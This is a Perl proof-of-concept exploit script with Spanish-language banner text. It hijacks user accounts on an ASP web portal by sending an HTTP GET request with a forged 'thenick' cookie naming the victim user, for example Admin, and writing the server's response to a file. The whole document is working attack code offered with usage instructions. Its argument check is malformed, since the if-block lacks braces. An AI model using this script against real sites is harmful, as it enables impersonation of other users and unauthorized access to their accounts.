#!/usr/bin/perl -w
## PROOF OF CONCEPT COOKIE ACCOUNT HIJACK
## Example: Asp-POC.pl localhost portal/index.asp Admin respuesta.htm

use IO::Socket;
if (@ARGV < 4)
 
print "\n\n";
print " ____________________________________________________________ \n";
print "|                                                            |\n";
print "|   PROOF OF CONCEPT COOKIE ACCOUNT HIJACK                   |\n";
print "|   Usage:Asp-POC.pl [host] [directorio] [usuario] [fichero] |\n";
print "|                                                            |\n";
print "|   By: Manuel López #IST                                    |\n";
print "|____________________________________________________________|\n";
print "\n\n";
exit(1);
 

$host = $ARGV[0];
$directorio = $ARGV[1];
$usuario = $ARGV[2];
$fichero = $ARGV[3];

print "\n";
print "----- Conectando <----\n";
$socket = IO::Socket::INET->new(Proto => "tcp",
PeerAddr => "$host",PeerPort => "80") || die "$socket error $!";
print "====> Conectado\n";
print "====> Enviando Datos\n";
$socket->print(<<taqui) or die "write: $!";
GET http://$host/$directorio HTTP/1.1
Cookie: thenick=$usuario

taqui
print "====> OK\n";
print "====> Generando $fichero ...\n";
open( Result, ">$fichero");
print Result while <$socket>;
close Result;
